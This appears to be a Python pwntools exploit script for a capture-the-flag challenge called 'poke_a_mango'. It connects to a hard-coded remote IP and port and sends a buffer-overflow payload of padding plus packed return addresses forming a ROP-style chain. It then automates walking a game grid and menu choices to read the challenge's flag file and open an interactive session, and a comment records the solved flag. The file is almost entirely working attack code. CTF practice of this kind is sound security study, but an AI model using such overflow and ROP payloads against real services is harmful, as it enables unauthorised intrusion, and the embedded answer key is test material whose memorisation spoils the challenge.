#!/usr/bin/env python

from pwn import *
import re
import sys

#host = "10.211.55.28"
#port = 8888
#flag : flag{g0t_t0_catch_all_the_mang0s}
host = "54.251.144.200"
port = 2303
r = remote(host,port)

mango = [
        'Foyt',
        'Petty',
        'Patrick',
        'Pastrana',
        'Gordon',
        ]



r.recvuntil('? ')

# username
r.sendline("A" * 28 + p32(0x60c840) + "a"*8 + p64(0x00000000004049de) + "b"*8 + p64(0x402048) + "c"*8 + p64(0x403ba4) + "e"*220)

data = r.recvuntil('> ')

m = re.match(r'.*x,y\): \((\d+\.\d+),(\d+\.\d+)\)', data, re.DOTALL)

# back to (0, 0)

if m:
    (x, y) = m.groups()

for _ in xrange(int(float(y))):
    r.sendline('s')
    r.recvuntil('> ')

for _ in xrange(int(float(x))):
    r.sendline('w')
    r.recvuntil('> ')

# declaration

def powerup():
    for _ in xrange(6):
        r.sendline('3')
        data = r.recvuntil('feed: ')
        
        m = re.match(r'.*\s+(\d+)\.\s+\S+\s', data, re.DOTALL)

        if not m:
            return

        mango_id = m.group(1)
        r.sendline(mango_id)
        data = r.recvuntil('> ')

        m = re.match(r'.*Powering up!', data, re.DOTALL)

        if not m:
            continue

        break

def poke():
    r.sendline('1')
    data = r.recvuntil('> ')

    m = re.match(r'.*Congratulations!', data, re.DOTALL)

    if not m:
        return False

    return True

def re_specific_mango(data):
    m = re.findall(r'.*You see a (\S+) \S+\.', data, re.DOTALL)

    if m:
        for name in m:
            if name in mango:
                return True

    return False

i = 0

def go(direction):
    global i
    r.sendline(direction)
    data = r.recvuntil('> ')

    # find specific mango
    if not re_specific_mango(data):
        return

    if i == 0:
        if not poke():
            return

        i += 1

        powerup()
        r.sendline("5")
        data = r.recvuntil(".").split()[-1].strip(".")
        idx = int(data)
        r.sendline(str(data))
        r.recvuntil("name:")
        r.sendline("ddaa")
        r.sendline("/home/poke_a_mango/flag")
        r.interactive()
        
# start
x = 0
y = 0

for _ in xrange(50):

    for _ in xrange(100):
        go('e')
    
    go('n')
    
    for _ in xrange(100):
        go('w')
    
    go('n')

r.interactive()
